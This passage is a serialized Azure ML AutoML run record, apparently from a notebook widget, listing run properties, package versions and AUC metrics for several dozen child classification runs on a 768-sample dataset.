{\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"age\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 2}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"class\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 0}]}, \\\\\\\\\\\\\\\"localData\\\\\\\\\\\\\\\": {}, \\\\\\\\\\\\\\\"isEnabled\\\\\\\\\\\\\\\": true, \\\\\\\\\\\\\\\"name\\\\\\\\\\\\\\\": null, \\\\\\\\\\\\\\\"annotation\\\\\\\\\\\\\\\": null}], \\\\\\\\\\\\\\\"inspectors\\\\\\\\\\\\\\\": [], \\\\\\\\\\\\\\\"meta\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"savedDatasetId\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"3a186ba5-5d2b-44ee-9193-6374f4ee91f1\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"datasetType\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"tabular\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"subscriptionId\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"8a086c9c-5530-4791-89af-62c8cdfda3fd\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"workspaceId\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"c3f71a46-26f3-421c-8037-b5fa54f65e44\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"workspaceLocation\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"australiaeast\\\\\\\\\\\\\\\"}}\\\\\\\", \\\\\\\"activities\\\\\\\": 0}\", \"EnableSubsampling\": null, \"runTemplate\": \"AutoML\", \"azureml.runsource\": \"automl\", \"display_task_type\": \"classification\", \"dependencies_versions\": \"{\\\"azureml-widgets\\\": \\\"1.9.0\\\", \\\"azureml-train\\\": \\\"1.18.0\\\", \\\"azureml-train-restclients-hyperdrive\\\": \\\"1.18.0\\\", \\\"azureml-train-core\\\": \\\"1.18.0.post1\\\", \\\"azureml-train-automl\\\": \\\"1.9.0\\\", \\\"azureml-train-automl-runtime\\\": \\\"1.20.0\\\", \\\"azureml-train-automl-client\\\": \\\"1.20.0\\\", \\\"azureml-tensorboard\\\": \\\"1.9.0\\\", \\\"azureml-telemetry\\\": \\\"1.20.0\\\", \\\"azureml-samples\\\": \\\"0+unknown\\\", \\\"azureml-pipeline\\\": \\\"1.18.0\\\", \\\"azureml-pipeline-steps\\\": \\\"1.18.0\\\", \\\"azureml-pipeline-core\\\": \\\"1.18.0\\\", \\\"azureml-opendatasets\\\": \\\"1.9.0\\\", \\\"azureml-monitoring\\\": \\\"0.1.0a18\\\", \\\"azureml-model-management-sdk\\\": \\\"1.0.1b6.post1\\\", \\\"azureml-mlflow\\\": \\\"1.9.0\\\", \\\"azureml-interpret\\\": \\\"1.20.0\\\", \\\"azureml-explain-model\\\": \\\"1.9.0\\\", \\\"azureml-defaults\\\": \\\"1.20.0\\\", \\\"azureml-dataset-runtime\\\": \\\"1.20.0\\\", \\\"azureml-dataprep\\\": \\\"2.7.3\\\", \\\"azureml-dataprep-rslex\\\": \\\"1.5.0\\\", \\\"azureml-dataprep-native\\\": \\\"27.0.0\\\", \\\"azureml-datadrift\\\": \\\"1.9.0\\\", \\\"azureml-core\\\": \\\"1.20.0\\\", \\\"azureml-contrib-services\\\": \\\"1.9.0\\\", \\\"azureml-contrib-server\\\": \\\"1.9.0\\\", \\\"azureml-contrib-reinforcementlearning\\\": \\\"1.9.0\\\", \\\"azureml-contrib-pipeline-steps\\\": \\\"1.9.0\\\", \\\"azureml-contrib-notebook\\\": \\\"1.9.0\\\", \\\"azureml-contrib-interpret\\\": \\\"1.9.0\\\", \\\"azureml-contrib-gbdt\\\": \\\"1.9.0\\\", \\\"azureml-contrib-fairness\\\": \\\"1.9.0\\\", \\\"azureml-contrib-dataset\\\": \\\"1.9.0\\\", \\\"azureml-cli-common\\\": \\\"1.9.0\\\", \\\"azureml-automl-runtime\\\": \\\"1.20.0\\\", \\\"azureml-automl-core\\\": \\\"1.20.0\\\", \\\"azureml-accel-models\\\": \\\"1.9.0\\\"}\", \"_aml_system_scenario_identification\": \"Remote.Parent\", \"ClientType\": \"SDK\", \"environment_cpu_name\": \"AzureML-AutoML\", \"environment_cpu_label\": \"prod\", \"environment_gpu_name\": \"AzureML-AutoML-GPU\", \"environment_gpu_label\": \"prod\", \"root_attribution\": \"automl\", \"attribution\": \"AutoML\", \"Orchestrator\": \"AutoML\", \"CancelUri\": \"https://australiaeast.experiments.azureml.net/jasmine/v1.0/subscriptions/8a086c9c-5530-4791-89af-62c8cdfda3fd/resourceGroups/trn-aue-advanced-analytics-ml/providers/Microsoft.MachineLearningServices/workspaces/trn-aue-aa-ml/experimentids/79cef33c-d1d9-48fc-bdb5-bf983ac4c63c/cancel/AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"ClientSdkVersion\": \"1.20.0.post1\", \"snapshotId\": \"00000000-0000-0000-0000-000000000000\", \"SetupRunId\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_setup\", \"SetupRunContainerId\": \"dcid.AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_setup\", \"FeaturizationRunJsonPath\": \"featurizer_container.json\", \"FeaturizationRunId\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_featurize\", \"ProblemInfoJsonString\": \"{\\\"dataset_num_categorical\\\": 0, \\\"is_sparse\\\": true, \\\"subsampling\\\": false, \\\"dataset_classes\\\": 2, \\\"dataset_features\\\": 24, \\\"dataset_samples\\\": 768, \\\"single_frequency_class_detected\\\": false}\", \"ModelExplainRunId\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_ModelExplain\"}, \"tags\": {\"model_explain_run\": \"best_run\", \"_aml_system_azureml.automlComponent\": \"AutoML\", \"pipeline_id\": \"\", \"score\": \"\", \"predicted_cost\": \"\", \"fit_time\": \"\", \"training_percent\": \"\", \"iteration\": \"\", \"run_preprocessor\": \"\", \"run_algorithm\": \"\", \"dynamic_whitelisting_iterations\": \"<25>;<30>;<35>;\", \"automl_best_child_run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_38\", \"model_explain_best_run_child_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_38\"}, \"end_time_utc\": \"2021-02-01T22:34:26.818085Z\", \"status\": \"Completed\", \"log_files\": {}, \"log_groups\": [], \"run_duration\": \"0:30:44\"}, \"child_runs\": [{\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_4\", \"run_number\": 256, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:11:47.892383Z\", \"end_time\": \"2021-02-01T22:13:40.165972Z\", \"created_time\": \"2021-02-01T22:11:37.41142Z\", \"created_time_dt\": \"2021-02-01T22:11:37.41142Z\", \"duration\": \"0:02:02\", \"iteration\": \"4\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.81984712, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_2\", \"run_number\": 257, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:14:42.564045Z\", \"end_time\": \"2021-02-01T22:16:56.6992Z\", \"created_time\": \"2021-02-01T22:11:37.433683Z\", \"created_time_dt\": \"2021-02-01T22:11:37.433683Z\", \"duration\": \"0:05:19\", \"iteration\": \"2\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.81841663, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_0\", \"run_number\": 258, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:13:47.948539Z\", \"end_time\": \"2021-02-01T22:15:44.304249Z\", \"created_time\": \"2021-02-01T22:11:37.437244Z\", \"created_time_dt\": \"2021-02-01T22:11:37.437244Z\", \"duration\": \"0:04:06\", \"iteration\": \"0\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, LightGBM\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.79810139, \"best_metric\": 0.79810139}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_1\", \"run_number\": 259, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:14:42.364995Z\", \"end_time\": \"2021-02-01T22:17:32.827293Z\", \"created_time\": \"2021-02-01T22:11:37.452514Z\", \"created_time_dt\": \"2021-02-01T22:11:37.452514Z\", \"duration\": \"0:05:55\", \"iteration\": \"1\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, XGBoostClassifier\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.83662103, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_3\", \"run_number\": 260, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:14:40.459799Z\", \"end_time\": \"2021-02-01T22:16:59.940515Z\", \"created_time\": \"2021-02-01T22:11:37.438902Z\", \"created_time_dt\": \"2021-02-01T22:11:37.438902Z\", \"duration\": \"0:05:22\", \"iteration\": \"3\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.82727973, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_5\", \"run_number\": 261, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:14:43.466099Z\", \"end_time\": \"2021-02-01T22:16:59.215043Z\", \"created_time\": \"2021-02-01T22:13:44.290343Z\", \"created_time_dt\": \"2021-02-01T22:13:44.290343Z\", \"duration\": \"0:03:14\", \"iteration\": \"5\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, ExtremeRandomTrees\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.81684895, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_6\", \"run_number\": 262, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:15:59.930394Z\", \"end_time\": \"2021-02-01T22:17:52.531417Z\", \"created_time\": \"2021-02-01T22:15:48.386253Z\", \"created_time_dt\": \"2021-02-01T22:15:48.386253Z\", \"duration\": \"0:02:04\", \"iteration\": \"6\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, ExtremeRandomTrees\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.80952076, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_7\", \"run_number\": 263, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:17:12.75786Z\", \"end_time\": \"2021-02-01T22:19:14.011119Z\", \"created_time\": \"2021-02-01T22:17:00.93343Z\", \"created_time_dt\": \"2021-02-01T22:17:00.93343Z\", \"duration\": \"0:02:13\", \"iteration\": \"7\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, ExtremeRandomTrees\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.79754719, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_9\", \"run_number\": 264, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:17:17.950405Z\", \"end_time\": \"2021-02-01T22:19:18.535953Z\", \"created_time\": \"2021-02-01T22:17:07.577416Z\", \"created_time_dt\": \"2021-02-01T22:17:07.577416Z\", \"duration\": \"0:02:10\", \"iteration\": \"9\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, ExtremeRandomTrees\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.78630551, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_8\", \"run_number\": 265, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:17:18.521832Z\", \"end_time\": \"2021-02-01T22:19:19.094698Z\", \"created_time\": \"2021-02-01T22:17:07.721826Z\", \"created_time_dt\": \"2021-02-01T22:17:07.721826Z\", \"duration\": \"0:02:11\", \"iteration\": \"8\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.80324026, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_10\", \"run_number\": 266, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:17:46.950681Z\", \"end_time\": \"2021-02-01T22:19:58.312994Z\", \"created_time\": \"2021-02-01T22:17:36.2517Z\", \"created_time_dt\": \"2021-02-01T22:17:36.2517Z\", \"duration\": \"0:02:22\", \"iteration\": \"10\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.81577912, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_11\", \"run_number\": 267, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:18:07.210591Z\", \"end_time\": \"2021-02-01T22:20:00.067923Z\", \"created_time\": \"2021-02-01T22:17:56.336629Z\", \"created_time_dt\": \"2021-02-01T22:17:56.336629Z\", \"duration\": \"0:02:03\", \"iteration\": \"11\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.80774186, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_12\", \"run_number\": 268, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:19:28.721663Z\", \"end_time\": \"2021-02-01T22:21:41.421344Z\", \"created_time\": \"2021-02-01T22:19:17.810006Z\", \"created_time_dt\": \"2021-02-01T22:19:17.810006Z\", \"duration\": \"0:02:23\", \"iteration\": \"12\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.77304217, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_13\", \"run_number\": 269, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:19:33.004088Z\", \"end_time\": \"2021-02-01T22:21:32.389203Z\", \"created_time\": \"2021-02-01T22:19:23.394727Z\", \"created_time_dt\": \"2021-02-01T22:19:23.394727Z\", \"duration\": \"0:02:08\", \"iteration\": \"13\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f82a963a7f0\", \"primary_metric\": 0.82080753, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_14\", \"run_number\": 270, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:19:34.20192Z\", \"end_time\": \"2021-02-01T22:21:30.590253Z\", \"created_time\": \"2021-02-01T22:19:23.47046Z\", \"created_time_dt\": \"2021-02-01T22:19:23.47046Z\", \"duration\": \"0:02:07\", \"iteration\": \"14\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.82057951, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_15\", \"run_number\": 271, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:20:13.741848Z\", \"end_time\": \"2021-02-01T22:22:14.096867Z\", \"created_time\": \"2021-02-01T22:20:02.404683Z\", \"created_time_dt\": \"2021-02-01T22:20:02.404683Z\", \"duration\": \"0:02:11\", \"iteration\": \"15\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, ExtremeRandomTrees\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f48ab2f8a90\", \"primary_metric\": 0.81825579, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_16\", \"run_number\": 272, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:20:19.311518Z\", \"end_time\": \"2021-02-01T22:22:07.408026Z\", \"created_time\": \"2021-02-01T22:20:08.779695Z\", \"created_time_dt\": \"2021-02-01T22:20:08.779695Z\", \"duration\": \"0:01:58\", \"iteration\": \"16\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, ExtremeRandomTrees\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.81466849, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_17\", \"run_number\": 273, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:21:45.696922Z\", \"end_time\": \"2021-02-01T22:23:50.058067Z\", \"created_time\": \"2021-02-01T22:21:34.432811Z\", \"created_time_dt\": \"2021-02-01T22:21:34.432811Z\", \"duration\": \"0:02:15\", \"iteration\": \"17\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, ExtremeRandomTrees\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.81037669, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_18\", \"run_number\": 274, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:21:50.009809Z\", \"end_time\": \"2021-02-01T22:23:54.578893Z\", \"created_time\": \"2021-02-01T22:21:39.696328Z\", \"created_time_dt\": \"2021-02-01T22:21:39.696328Z\", \"duration\": \"0:02:14\", \"iteration\": \"18\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.80387154, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_19\", \"run_number\": 275, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:21:54.516363Z\", \"end_time\": \"2021-02-01T22:23:53.539942Z\", \"created_time\": \"2021-02-01T22:21:44.8698Z\", \"created_time_dt\": \"2021-02-01T22:21:44.8698Z\", \"duration\": \"0:02:08\", \"iteration\": \"19\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, LightGBM\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.82230628, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_20\", \"run_number\": 276, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:22:21.188707Z\", \"end_time\": \"2021-02-01T22:24:22.855482Z\", \"created_time\": \"2021-02-01T22:22:10.148704Z\", \"created_time_dt\": \"2021-02-01T22:22:10.148704Z\", \"duration\": \"0:02:12\", \"iteration\": \"20\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, LogisticRegression\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.82102317, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_21\", \"run_number\": 277, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:22:27.280843Z\", \"end_time\": \"2021-02-01T22:24:20.530652Z\", \"created_time\": \"2021-02-01T22:22:16.985742Z\", \"created_time_dt\": \"2021-02-01T22:22:16.985742Z\", \"duration\": \"0:02:03\", \"iteration\": \"21\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7fae5422fac8\", \"primary_metric\": 0.82402664, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_22\", \"run_number\": 278, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:24:03.530982Z\", \"end_time\": \"2021-02-01T22:26:03.7678Z\", \"created_time\": \"2021-02-01T22:23:52.511257Z\", \"created_time_dt\": \"2021-02-01T22:23:52.511257Z\", \"duration\": \"0:02:11\", \"iteration\": \"22\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, LightGBM\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.81522085, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_23\", \"run_number\": 279, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:24:06.925178Z\", \"end_time\": \"2021-02-01T22:26:06.503246Z\", \"created_time\": \"2021-02-01T22:23:56.39155Z\", \"created_time_dt\": \"2021-02-01T22:23:56.39155Z\", \"duration\": \"0:02:10\", \"iteration\": \"23\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7fa134074dd8\", \"primary_metric\": 0.81611286, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_24\", \"run_number\": 280, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:24:09.702967Z\", \"end_time\": \"2021-02-01T22:26:13.404268Z\", \"created_time\": \"2021-02-01T22:24:00.084839Z\", \"created_time_dt\": \"2021-02-01T22:24:00.084839Z\", \"duration\": \"0:02:13\", \"iteration\": \"24\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7fa1dbfe7cf8\", \"primary_metric\": 0.82984727, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_25\", \"run_number\": 281, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:24:35.552118Z\", \"end_time\": \"2021-02-01T22:26:39.755096Z\", \"created_time\": \"2021-02-01T22:24:25.156767Z\", \"created_time_dt\": \"2021-02-01T22:24:25.156767Z\", \"duration\": \"0:02:14\", \"iteration\": \"25\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f54e3eb5828\", \"primary_metric\": 0.78680683, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_26\", \"run_number\": 282, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:24:40.350094Z\", \"end_time\": \"2021-02-01T22:27:02.027997Z\", \"created_time\": \"2021-02-01T22:24:29.12387Z\", \"created_time_dt\": \"2021-02-01T22:24:29.12387Z\", \"duration\": \"0:02:32\", \"iteration\": \"26\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7fe3138d2f60\", \"primary_metric\": 0.81520112, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_27\", \"run_number\": 283, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:26:19.367832Z\", \"end_time\": \"2021-02-01T22:28:22.658252Z\", \"created_time\": \"2021-02-01T22:26:08.869202Z\", \"created_time_dt\": \"2021-02-01T22:26:08.869202Z\", \"duration\": \"0:02:13\", \"iteration\": \"27\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f1d325f7358\", \"primary_metric\": 0.81328092, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_28\", \"run_number\": 284, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:26:23.035478Z\", \"end_time\": \"2021-02-01T22:28:19.498378Z\", \"created_time\": \"2021-02-01T22:26:12.490385Z\", \"created_time_dt\": \"2021-02-01T22:26:12.490385Z\", \"duration\": \"0:02:07\", \"iteration\": \"28\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"SparseNormalizer, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.SparseNormalizer object at 0x7f267e6d4470\", \"primary_metric\": 0.72233183, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_29\", \"run_number\": 285, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:26:26.807073Z\", \"end_time\": \"2021-02-01T22:28:25.983256Z\", \"created_time\": \"2021-02-01T22:26:16.269382Z\", \"created_time_dt\": \"2021-02-01T22:26:16.269382Z\", \"duration\": \"0:02:09\", \"iteration\": \"29\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, LogisticRegression\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7fd229819fd0\", \"primary_metric\": 0.82450407, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_30\", \"run_number\": 286, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:26:55.260019Z\", \"end_time\": \"2021-02-01T22:29:00.150462Z\", \"created_time\": \"2021-02-01T22:26:44.111888Z\", \"created_time_dt\": \"2021-02-01T22:26:44.111888Z\", \"duration\": \"0:02:16\", \"iteration\": \"30\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"TruncatedSVDWrapper, XGBoostClassifier\", \"run_properties\": \"n_components=0.7521052631578947, random_state=None\", \"primary_metric\": 0.80426642, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea_31\", \"run_number\": 287, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T22:27:15.248122Z\", \"end_time\": \"2021-02-01T22:29:06.88771Z\", \"created_time\": \"2021-02-01T22:27:04.389617Z\", \"created_time_dt\": \"2021-02-01T22:27:04.389617Z\", 